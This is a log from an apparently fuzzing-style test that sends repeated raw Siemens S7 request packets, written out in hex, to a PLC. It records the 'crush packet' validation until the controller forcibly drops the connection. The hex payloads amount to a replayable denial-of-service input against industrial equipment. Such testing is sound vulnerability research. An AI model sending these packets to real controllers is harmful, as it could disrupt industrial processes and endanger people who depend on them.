[2021-11-29 20:02:59,979] [INFO] [valition.<module>] -> Will send 100000 packets, the crush packet is 5
[2021-11-29 20:02:59,980] [INFO] [MyS7Client.connect] -> Start connect PLC
[2021-11-29 20:03:42,846] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002c00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:43,049] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002d00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:43,256] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002e00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:43,459] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700002f00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:43,674] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003000000800080001120411440100ff090004001c0000
[2021-11-29 20:03:43,877] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003100000800080001120411440100ff090004001c0000
[2021-11-29 20:03:44,083] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003200000800080001120411440100ff090004001c0000
[2021-11-29 20:03:44,300] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003300000800080001120411440100ff090004001c0000
[2021-11-29 20:03:44,504] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003400000800080001120411440100ff090004001c0000
[2021-11-29 20:03:44,707] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003500000800080001120411440100ff090004001c0000
[2021-11-29 20:03:44,910] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003600000800080001120411440100ff090004001c0000
[2021-11-29 20:03:45,127] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003700000800080001120411440100ff090004001c0000
[2021-11-29 20:03:45,345] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003800000800080001120411440100ff090004001c0000
[2021-11-29 20:03:45,547] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003900000800080001120411440100ff090004001c0000
[2021-11-29 20:03:45,754] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003a00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:45,973] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003b00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:46,178] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003c00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:46,395] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003d00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:46,599] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003e00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:46,818] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700003f00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:47,034] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004000000800080001120411440100ff090004001c0000
[2021-11-29 20:03:47,250] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004100000800080001120411440100ff090004001c0000
[2021-11-29 20:03:47,468] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004200000800080001120411440100ff090004001c0000
[2021-11-29 20:03:47,673] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004300000800080001120411440100ff090004001c0000
[2021-11-29 20:03:47,887] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004400000800080001120411440100ff090004001c0000
[2021-11-29 20:03:48,090] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004500000800080001120411440100ff090004001c0000
[2021-11-29 20:03:48,308] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004600000800080001120411440100ff090004001c0000
[2021-11-29 20:03:48,522] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004700000800080001120411440100ff090004001c0000
[2021-11-29 20:03:48,724] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004800000800080001120411440100ff090004001c0000
[2021-11-29 20:03:48,940] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004900000800080001120411440100ff090004001c0000
[2021-11-29 20:03:49,157] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004a00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:49,360] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004b00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:49,577] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004c00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:49,778] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004d00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:49,981] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004e00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:50,201] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700004f00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:50,416] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005000000800080001120411440100ff090004001c0000
[2021-11-29 20:03:50,626] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005100000800080001120411440100ff090004001c0000
[2021-11-29 20:03:50,844] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005200000800080001120411440100ff090004001c0000
[2021-11-29 20:03:51,058] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005300000800080001120411440100ff090004001c0000
[2021-11-29 20:03:51,265] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005400000800080001120411440100ff090004001c0000
[2021-11-29 20:03:51,483] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005500000800080001120411440100ff090004001c0000
[2021-11-29 20:03:51,697] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005600000800080001120411440100ff090004001c0000
[2021-11-29 20:03:51,899] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005700000800080001120411440100ff090004001c0000
[2021-11-29 20:03:52,102] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005800000800080001120411440100ff090004001c0000
[2021-11-29 20:03:52,310] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005900000800080001120411440100ff090004001c0000
[2021-11-29 20:03:52,530] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005a00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:52,745] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005b00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:52,949] [INFO] [MyS7Client.send_s7_packet] -> [request]0300002102f080320700005c00000800080001120411440100ff090004001c0000
[2021-11-29 20:03:53,164] [ERROR] [MyS7Client.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-11-29 20:03:53,367] [ERROR] [MyS7Client.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-11-29 20:03:53,570] [ERROR] [MyS7Client.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-11-29 20:03:53,772] [ERROR] [MyS7Client.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-11-29 20:03:53,974] [ERROR] [MyS7Client.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-11-29 20:03:54,175] [ERROR] [MyS7Client.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-11-29 20:03:54,378] [ERROR] [MyS7Client.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-11-29 20:03:54,595] [ERROR] [MyS7Client.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-11-29 20:03:54,810] [ERROR] [MyS7Client.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-11-29 20:03:55,025] [ERROR] [MyS7Client.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-11-29 20:03:55,231] [ERROR] [MyS7Client.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-11-29 20:03:55,446] [ERROR] [MyS7Client.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-11-29 20:03:55,649] [ERROR] [MyS7Client.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
[2021-11-29 20:03:55,855] [ERROR] [MyS7Client.send_s7_packet] -> [WinError 10054] 远程主机强迫关闭了一个现有的连接。
